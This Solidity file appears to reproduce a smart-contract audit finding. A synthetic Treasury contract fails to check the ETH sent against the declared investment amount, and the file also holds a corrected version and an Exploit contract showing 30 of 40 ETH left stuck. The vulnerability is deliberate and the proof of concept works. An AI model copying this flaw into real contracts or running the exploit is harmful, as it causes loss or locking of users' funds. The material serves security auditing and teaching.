// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Devve Treasury — investInProjects does not match msg.value to users.amount
    (Zokyo, 2024-06-30 Devve, high).

    SYNTHETIC, cheatcode-free reduction. The investor sends 40 ETH and passes
    users.amount of 10 ETH. The real deposit is stored in
    investorInvestedAmountPerProjectInETH. Settlement pays users.amount.
    The owner receives 10 ETH. 30 ETH stays in the treasury.
    The control rejects the mismatch and pays the real 40 ETH. */

struct Whitelist {
    address userAddress;
    uint256 projectId;
    uint256 amount;
    bool inETH;
    uint256 platformFee;
}

contract Treasury {
    mapping(uint256 => mapping(address => uint256)) public investorInvestedAmountPerProjectInETH;
    mapping(uint256 => mapping(address => uint256)) public creditedAmount;
    mapping(uint256 => uint256) public projectTotalCollectedInETH;
    mapping(uint256 => mapping(bool => uint256)) public fundsWithdrawn;
    address public lastInvestor;
    bool public settled;

    function investInProjects(Whitelist memory users) external payable virtual {
        // @> VULN: msg.value is not required to equal users.amount
        investorInvestedAmountPerProjectInETH[users.projectId][msg.sender] += msg.value;
        creditedAmount[users.projectId][msg.sender] = users.amount;
        projectTotalCollectedInETH[users.projectId] += msg.value;
        lastInvestor = msg.sender;
    }

    function settleProjectOwnerFunds(Whitelist memory users) external virtual {
        require(!settled, "settled");
        uint256 _amountToWithdraw = users.amount;
        fundsWithdrawn[users.projectId][users.inETH] += _amountToWithdraw;
        uint256 collected = projectTotalCollectedInETH[users.projectId];
        uint256 deducedAmount = collected - (collected * users.platformFee) / 100;
        require(deducedAmount >= fundsWithdrawn[users.projectId][users.inETH], "check deducedAmount");
        // @> VULN: pays users.amount, not investorInvestedAmountPerProjectInETH
        payable(users.userAddress).transfer(_amountToWithdraw);
        projectTotalCollectedInETH[users.projectId] -= _amountToWithdraw;
        settled = true;
    }
}

contract TreasuryFixed is Treasury {
    function investInProjects(Whitelist memory users) external payable override {
        require(msg.value == users.amount, "amount");
        investorInvestedAmountPerProjectInETH[users.projectId][msg.sender] += msg.value;
        creditedAmount[users.projectId][msg.sender] = users.amount;
        projectTotalCollectedInETH[users.projectId] += msg.value;
        lastInvestor = msg.sender;
    }

    function settleProjectOwnerFunds(Whitelist memory users) external override {
        require(!settled, "settled");
        uint256 real = investorInvestedAmountPerProjectInETH[users.projectId][lastInvestor];
        fundsWithdrawn[users.projectId][users.inETH] += real;
        uint256 collected = projectTotalCollectedInETH[users.projectId];
        uint256 deducedAmount = collected - (collected * users.platformFee) / 100;
        require(deducedAmount >= fundsWithdrawn[users.projectId][users.inETH], "check deducedAmount");
        payable(users.userAddress).transfer(real);
        projectTotalCollectedInETH[users.projectId] -= real;
        settled = true;
    }
}

contract Exploit {
    address public constant OWNER = 0x2222222222222222222222222222222222222222;
    uint256 public constant SENT = 40 ether;
    uint256 public constant CREDITED = 10 ether;

    Treasury public treasury;
    uint256 public credited;
    uint256 public invested;
    uint256 public paid;

    constructor() {
        treasury = new Treasury();
    }

    function run() external payable {
        require(msg.value == SENT, "value");
        Whitelist memory users = Whitelist({
            userAddress: OWNER,
            projectId: 1,
            amount: CREDITED,
            inETH: true,
            platformFee: 0
        });
        treasury.investInProjects{value: msg.value}(users);
        credited = treasury.creditedAmount(1, address(this));
        invested = treasury.investorInvestedAmountPerProjectInETH(1, address(this));
        treasury.settleProjectOwnerFunds(users);
        paid = OWNER.balance;
        require(credited == CREDITED, "credited");
        require(invested == SENT, "invested");
        require(paid == CREDITED, "paid");
        require(address(treasury).balance == SENT - CREDITED, "stuck");
    }
}
